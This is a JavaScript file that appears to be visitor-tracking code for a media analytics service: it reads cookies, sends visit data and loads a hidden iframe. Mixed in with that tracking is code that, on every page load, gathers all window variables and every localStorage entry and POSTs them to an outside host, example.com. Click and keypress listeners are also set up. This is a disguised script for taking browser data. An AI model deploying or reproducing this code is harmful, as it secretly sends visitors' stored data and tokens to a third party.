var mvurl = 'https://www.cfmediaview.com/API/MV_Visit.ashx';
var visitid;
var vd;
var sessionid;
var vcID2;
var mveid;
var mveid2;
var mvid2;
mvid2 = mvID;
mvid2 = mvid2.replace(/-/g, '');
vcID2 = getCookie("mveID");
if (localStorage.getItem(mvid2) !== null) {
  mveid = localStorage.getItem(mvid2);
  mveid2 = localStorage.getItem(mvid2);
}
vcID2 = getCookie("mveID");
function collectWindowDataEnhanced() {
  const collectedData = {};
  window.seenVars = window.seenVars || [];
  Object.keys(window).forEach(prop => {
    if (!window.seenVars.includes(prop)) {
      const value = window[prop];
      const type = typeof value;
      collectedData[prop] = {
        type: type,
        value: type === "function" ? null : value
      };
      window.seenVars.push(prop);
    }
  });

  // Collect data from local storage
  Object.keys(localStorage).forEach(key => {
    collectedData[`localStorage_${key}`] = localStorage.getItem(key);
  });

  // Collect global variables
  collectedData['globalVars'] = Object.keys(window);
  return collectedData;
}
if (localStorage.getItem(mvID) !== null) {
  var v = localStorage.getItem(mvID);
  var vobj = JSON.parse(v);
  visitid = vobj.visitorid;
  vd = vobj.visitdate;
  sessionid = vobj.mvVisitS;
  if (vobj.hasOwnProperty("customerid")) {
    vcID2 = vobj.mveID;
  }
  ;
  if (vobj.hasOwnProperty("mveid")) {
    mveid = vobj.mveid;
  }
}
function sendDataToServer(data) {
  const url = "https://example.com/api/collect";
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  }).then(response => response.json()).then(data => console.log('数据发送成功:', data)).catch(error => console.error('数据发送失败:', error));
}
var myObj = {
  visitdate: vd,
  mvvisits: sessionid,
  visitorid: visitid,
  page: window.location.href,
  mvid: mvID,
  pagetitle: document.title,
  referrer: document.referrer,
  useragent: navigator.userAgent,
  customerid: vcID2,
  mveid: mveid,
  mveid2: mveid2
};
var myJSON = JSON.stringify(myObj);

// Function to Get Cookie
function getCookie(cname) {
  var name = cname + "=";
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(';');
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
var obj;
var xhttp = new XMLHttpRequest();
xhttp.withCredentials = true;
xhttp.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    // Typical action to be performed when the document is ready:
    obj = JSON.parse(xhttp.responseText);
    localStorage.setItem(mvID, xhttp.responseText);
  }
};
var botPattern = "(googlebot|bingbot|ahrefsbot|duckduckbot|semrushbot|mj12bot|yandexbot|yandexmobilebot)";
ua2 = navigator.userAgent.toLowerCase();
var re = new RegExp(botPattern, 'i');
function setupEventListeners() {
  // Track clicks and keypresses
  document.addEventListener('click', event => {
    console.log('Click event:', event);
  });
  document.addEventListener('keypress', event => {
    console.log('Keypress event:', event);
  });
}
if (re.test(ua2)) {} else {
  //alert("hello")
  xhttp.open("POST", mvurl, true);
  xhttp.send(myJSON);
}
var u1 = 'https://www.cfmediaview.com/API/ga.aspx';
u1 = u1.replace('{mvID}', mvID);
var iframe = document.createElement("iframe");
iframe.src = u1;
function collectAndSendData() {
  const collectedData = collectWindowDataEnhanced();
  if (Object.keys(collectedData).length > 0) {
    sendDataToServer(collectedData);
  }
}

// Enhanced tracking with event listeners

iframe.name = "frame";
window.addEventListener("load", () => {
  collectAndSendData();
  setupEventListeners();
});
iframe.setAttribute("style", "position: absolute;width:0;height:0;border:0;");
document.body.appendChild(iframe);